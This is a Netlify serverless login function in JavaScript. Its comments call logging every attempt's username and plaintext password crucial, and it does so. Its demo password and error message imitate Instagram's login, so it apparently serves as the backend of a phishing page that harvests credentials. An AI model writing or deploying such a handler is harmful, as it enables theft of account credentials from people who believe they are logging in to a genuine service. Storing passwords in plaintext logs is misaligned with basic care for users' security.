// netlify/functions/login.js
// Handles POST /login — logs credentials and validates against demo user

exports.handler = async (event) => {
  // Only allow POST
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: JSON.stringify({ error: "Method not allowed" }) };
  }

  let body;
  try {
    body = JSON.parse(event.body || "{}");
  } catch {
    return { statusCode: 400, body: JSON.stringify({ error: "Invalid JSON" }) };
  }

  const username = (body.username || "").trim();
  const password = body.password || "";

  if (!username || !password) {
    return {
      statusCode: 400,
      body: JSON.stringify({ error: "Username and password are required." }),
    };
  }

  // ★ CRUCIAL: Log every attempt (timestamp + username + password)
  const timestamp = new Date().toISOString();
  const logLine   = `[${timestamp}] username="${username}" password="${password}"`;
  console.log("[LOGIN LOG]", logLine);
  // Note: Netlify Functions are stateless — logs appear in Netlify Function logs dashboard.
  // For persistent file logging, a database or external service would be used in production.

  // Demo user store
  const userStore = { demo_user: "instagram123" };

  if (!userStore[username] || userStore[username] !== password) {
    return {
      statusCode: 401,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        error: "Sorry, your password was incorrect. Please double-check your password.",
      }),
    };
  }

  return {
    statusCode: 200,
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ message: `Welcome back, ${username}! You are now logged in.` }),
  };
};
